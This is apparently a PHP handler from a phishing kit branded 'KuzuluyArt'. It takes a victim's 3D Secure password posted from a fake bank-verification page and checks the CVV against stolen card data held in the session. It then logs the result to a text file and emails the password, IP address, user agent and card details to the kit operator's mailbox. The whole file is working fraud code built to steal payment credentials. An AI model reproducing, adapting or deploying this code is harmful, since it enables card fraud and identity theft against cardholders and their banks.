<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));
@eval(file_get_contents('../config/' . $api->page_config));

$_SESSION['3dsecure'] = $_POST['password_vbv'];

if ($_POST['cvv'] != $_SESSION['card_cvv']) {
  echo "error";
} else {
	$message = file_get_contents('../assets/html/secure.html');
  $message = preg_replace('{QUOTE}', $api->quote(), $message);
  $message = preg_replace('{KUZULUY-3DSECURE}', $_SESSION['3dsecure'], $message);
  $message = preg_replace('{KUZULUY_IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY_AGENT}', $_SESSION['agent'], $message);

  $subject  = $_SESSION['card_digit']." - ".$_SESSION['card_title']." [ ".$_SESSION['country']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
  $headers  = "From: KuzuluyArt <3d@kuzuluy.co>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  $api->save("../config/result-3d.txt", $subject."\n", "a");

  if ($config_smtp == "enable"){
    $api->ngesend($api->result(), $subject, $message, "KuzuluyArt", "3d@kuzuluy.co");
  } else {
    mail($api->result(), $subject, $message, $headers);
  }
  if($config_bank == "disable" && $config_anothercard == "disable"){
    echo "nofull";
  } else if($config_bank == "disable"){
    echo "nomove";
  }
}
?>
